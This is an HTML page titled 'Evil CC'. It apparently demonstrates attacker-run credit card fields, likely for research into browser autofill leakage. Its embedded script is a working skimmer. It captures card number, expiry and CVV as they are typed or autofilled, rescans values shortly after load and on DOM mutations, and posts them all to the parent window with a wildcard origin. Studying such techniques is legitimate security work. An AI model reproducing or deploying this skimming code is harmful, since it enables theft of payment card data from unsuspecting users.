<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Evil CC</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/styles.css">
</head>

<body>
    <main class="container py-4">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Evil CC form</h5>
                        <form id="ccForm">
                            <div class="mb-3">
                                <label class="form-label">Card number</label>
                                <input autocomplete="cc-number" name="cc-number" type="text" class="form-control" placeholder="4111 1111 1111 1111">
                            </div>
                            <div class="mb-3">
                                <label class="form-label">Expiry</label>
                                <input autocomplete="cc-exp" name="cc-exp" type="text" class="form-control" placeholder="MM/YY">
                            </div>
                            <div class="mb-3">
                                <label class="form-label">CVV/CVC</label>
                                <input autocomplete="cvv/cvc" name="cvv/cvc" type="text" class="form-control"
                                    placeholder="###">
                            </div>
                        </form>
                        <div class="mt-3 small text-muted">This page simulates attacker-run credit card fields.</div>
                    </div>
                </div>
            </div>
        </div>
    </main>


    <script>
  (function(){
    function send(msg) {
      try {
        window.parent.postMessage(msg, '*'); // možeš zameniti '*' sa parent origin radi sigurnosti
      } catch(e) {
        console.warn('postMessage failed', e);
      }
    }

    function watchInputs() {
      const inputs = document.querySelectorAll('input, textarea, select');
      inputs.forEach(inp => {
        inp.addEventListener('input', () => {
          send({ type: 'INPUT_CHANGE', id: inp.id || inp.name || 'unknown', value: inp.value });
        });
        inp.addEventListener('change', () => {
          send({ type: 'INPUT_CHANGE', id: inp.id || inp.name || 'unknown', value: inp.value });
        });
      });
    }

    // also notify about autofill events: try to detect value changes shortly after load (some autofill happens on load)
    window.addEventListener('load', () => {
      send({ type: 'EVIL_LOADED', url: location.href });
      watchInputs();
      // scan initial values (in case autofill filled them immediately)
      setTimeout(() => {
        const initial = [];
        document.querySelectorAll('input').forEach(i => {
          if (i.value) {
            initial.push({ id: i.id || i.name, value: i.value });
          }
        });
        if (initial.length) send({ type: 'INITIAL_VALUES', values: initial });
      }, 200); // 200ms after load
    });

    // intercept form submit
    document.addEventListener('submit', (ev) => {
      const form = ev.target;
      send({ type: 'FORM_SUBMIT', action: form.action || location.href });
    }, true);

    // optional: observe DOM mutations to detect programmatic fills
    const obs = new MutationObserver(() => {
      const changed = [];
      document.querySelectorAll('input').forEach(i => {
        if (i.value) changed.push({ id: i.id || i.name, value: i.value });
      });
      if (changed.length) send({ type: 'MUTATION_VALUES', values: changed });
    });
    obs.observe(document, { attributes: true, childList: true, subtree: true, attributeFilter: ['value'] });
  })();
</script>

</body>

</html>
